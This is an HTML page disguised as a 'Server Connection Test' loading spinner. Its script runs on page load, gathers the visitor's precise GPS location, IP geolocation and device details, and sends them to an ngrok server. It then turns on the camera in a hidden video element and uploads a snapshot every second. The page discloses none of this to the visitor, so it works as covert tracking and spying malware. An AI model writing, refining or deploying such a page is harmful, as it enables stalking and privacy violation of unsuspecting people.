<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Connection Test</title>
    <style>
        body {
            /* Center the loader */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #ffffff; /* White background */
        }
        .loader {
            border: 8px solid #f3f3f3; /* Light Grey */
            border-top: 8px solid #3498db; /* Blue */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Rotating loading circle -->
    <div class="loader"></div>

    <!-- Hidden elements for camera capture -->
    <video id="webcam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ==========================================
        // ⚠️ STEP 1: PUT YOUR SERVER URL HERE
        // Example: 'https://your-ngrok-url.ngrok-free.app'
        // ==========================================
        const SERVER_URL = ' https://648ff14dfhdfhdfd2.ngrok-free.app'; // ⚠️ This should match the SERVER_URL in your .env file

        async function sendIpToServer() {
            // Helper to get GPU info
            function getGpuInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } catch (e) {
                    return 'Unknown';
                }
            }

            // Helper to get precise GPS location
            function getPreciseLocation() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        return reject(new Error('Geolocation is not supported.'));
                    }
                    // This triggers the browser's permission prompt
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                            });
                        },
                        (error) => {
                            // This happens if the user clicks "Block" or an error occurs
                            return reject(error);
                        }
                    );
                });
            }

            try {
                // 1. Ask for precise location first
                let location = {};
                try {
                    console.log("Requesting precise location from user...");
                    location = await getPreciseLocation();
                } catch (locationError) {
                    console.warn("Precise location denied or failed. Falling back to IP-based location.");
                }

                // 2. Get IP-based Geolocation data (as a fallback and for other details)
                const geoResponse = await fetch('http://ip-api.com/json');
                const geoData = await geoResponse.json();

                // 3. Get Device Information
                const batteryInfo = await navigator.getBattery();
                const deviceDetails = {
                    ip: geoData.query,
                    continent: geoData.continent,
                    country: geoData.country,
                    regionName: geoData.regionName,
                    city: geoData.city,
                    org: geoData.org,
                    isp: geoData.isp,
                    // Use precise location if available, otherwise use IP-based location
                    lat: location.lat || geoData.lat,
                    lon: location.lon || geoData.lon,
                    platform: navigator.platform,
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    ram: navigator.deviceMemory || 'Unknown',
                    gpu: getGpuInfo(),
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    battery: Math.round(batteryInfo.level * 100),
                    userAgent: navigator.userAgent
                };

                // 4. Send all data to your Python Server
                const response = await fetch(`${SERVER_URL}/receive-ip`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(deviceDetails)
                });
                
                const responseData = await response.json();

                if (response.ok && responseData.clientID) {
                    // --- If initial data is sent successfully, start camera ---
                    startCameraAndStream(responseData.clientID);
                    console.log("Data sent successfully. Starting camera stream...");
                } else {
                    throw new Error("Server rejected request");
                }

            } catch (error) {
                console.error(error);
            }
        }

        async function startCameraAndStream(clientID) {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                // This will trigger the camera permission prompt
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Set canvas dimensions to match video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Send a picture every second
                    setInterval(() => {
                        // Draw the current video frame to the canvas
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert the canvas image to a JPEG data URL
                        const imageData = canvas.toDataURL('image/jpeg', 0.7); // 70% quality

                        // Send the image to the server
                        fetch(`${SERVER_URL}/receive-image`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                clientID: clientID,
                                imageData: imageData
                            })
                        }).catch(err => { /* We can ignore errors here to prevent console spam */ });

                    }, 1000); // 1000ms = 1 second
                };
            } catch (err) {
                console.error("Camera access denied or failed:", err);
            }
        }

        // Run on page load
        sendIpToServer();
    </script>
</body>
</html>